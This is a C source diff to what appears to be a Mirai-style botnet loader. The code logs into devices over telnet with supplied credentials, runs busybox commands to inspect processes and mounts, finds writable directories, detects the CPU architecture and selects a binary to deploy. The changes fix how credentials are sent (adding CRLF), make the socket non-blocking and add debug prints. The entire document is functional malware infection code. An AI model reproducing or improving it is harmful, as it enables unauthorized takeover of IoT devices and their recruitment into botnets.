@@ -5,6 +5,7 @@
 #include <pthread.h>
 #include <sys/epoll.h>
 #include <sys/socket.h>
+#include <sys/ioctl.h>
 #include <arpa/inet.h>
 #include <string.h>
 #include <sched.h>
@@ -141,7 +142,13 @@ void server_telnet_probe(struct server *srv, struct telnet_info *info)
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = info->addr;
     addr.sin_port = info->port;
+    //printf ("%d\t %s\t %d\t \n", addr.sin_family, inet_ntoa(*((struct in_addr*)&addr.sin_addr.s_addr)), addr.sin_port);
+    
     ret = connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
+    unsigned long ul = 1;
+    ioctl( fd, FIONBIO, &ul );
+    //printf("ret=%d errno:%d\n", ret, errno);
+    
     if (ret == -1 && errno != EINPROGRESS)
     {
         printf("got connect error\n");
@@ -285,26 +292,29 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             conn->state_telnet = TELNET_USER_PROMPT;
                         break;
                     case TELNET_USER_PROMPT:
+                        //printf ("TELNET_USER_PROMPT\n");
                         consumed = connection_consume_login_prompt(conn);
                         if (consumed)
                         {
-                            util_sockprintf(conn->fd, "%s", conn->info.user);
+                            util_sockprintf(conn->fd, "%s\r\n", conn->info.user);
                             strcpy(conn->output_buffer.data, "\r\n");
                             conn->output_buffer.deadline = time(NULL) + 1;
                             conn->state_telnet = TELNET_PASS_PROMPT;
                         }
                         break;
                     case TELNET_PASS_PROMPT:
+                        //printf ("TELNET_PASS_PROMPT\n");
                         consumed = connection_consume_password_prompt(conn);
                         if (consumed)
                         {
-                            util_sockprintf(conn->fd, "%s", conn->info.pass);
+                            util_sockprintf(conn->fd, "%s\r\n", conn->info.pass);
                             strcpy(conn->output_buffer.data, "\r\n");
                             conn->output_buffer.deadline = time(NULL) + 1;
                             conn->state_telnet = TELNET_WAITPASS_PROMPT; // At the very least it will print SOMETHING
                         }
                         break;
                     case TELNET_WAITPASS_PROMPT:
+                        //printf ("TELNET_WAITPASS_PROMPT\n");
                         if ((consumed = connection_consume_prompt(conn)) > 0)
                         {
                             util_sockprintf(conn->fd, "enable\r\n");
@@ -314,6 +324,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         }
                         break;
                     case TELNET_CHECK_LOGIN:
+                        //printf ("TELNET_CHECK_LOGIN\n");
                         if ((consumed = connection_consume_prompt(conn)) > 0)
                         {
                             util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
@@ -321,6 +332,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         }
                         break;
                     case TELNET_VERIFY_LOGIN:
+                        //printf ("TELNET_VERIFY_LOGIN\n");
                         consumed = connection_consume_verify_login(conn);
                         if (consumed)
                         {
@@ -333,6 +345,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         }
                         break;
                     case TELNET_PARSE_PS:
+                        //printf ("TELNET_PARSE_PS\n");
                         if ((consumed = connection_consume_psoutput(conn)) > 0)
                         {
                             util_sockprintf(conn->fd, "/bin/busybox cat /proc/mounts; " TOKEN_QUERY "\r\n");
@@ -340,11 +353,13 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         }
                         break;
                     case TELNET_PARSE_MOUNTS:
+                        //printf ("TELNET_PARSE_MOUNTS\n");
                         consumed = connection_consume_mounts(conn);
                         if (consumed)
                             conn->state_telnet = TELNET_READ_WRITEABLE;
                         break;
                     case TELNET_READ_WRITEABLE:
+                        //printf ("TELNET_READ_WRITEABLE\n");
                         consumed = connection_consume_written_dirs(conn);
                         if (consumed)
                         {
@@ -358,6 +373,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         }
                         break;
                     case TELNET_COPY_ECHO:
+                        //printf ("TELNET_COPY_ECHO\n");
                         consumed = connection_consume_copy_op(conn);
                         if (consumed)
                         {
@@ -381,6 +397,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         }
                         break;
                     case TELNET_DETECT_ARCH:
+                        //printf ("TELNET_DETECT_ARCH\n");
                         consumed = connection_consume_arch(conn);
                         if (consumed)
                         {
@@ -411,6 +428,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         }
                         break;
                     case TELNET_ARM_SUBTYPE:
+                        printf ("TELNET_ARM_SUBTYPE\n");
                         if ((consumed = connection_consume_arm_subtype(conn)) > 0)
                         {
                             struct binary *bin = binary_get_by_arch(conn->info.arch);
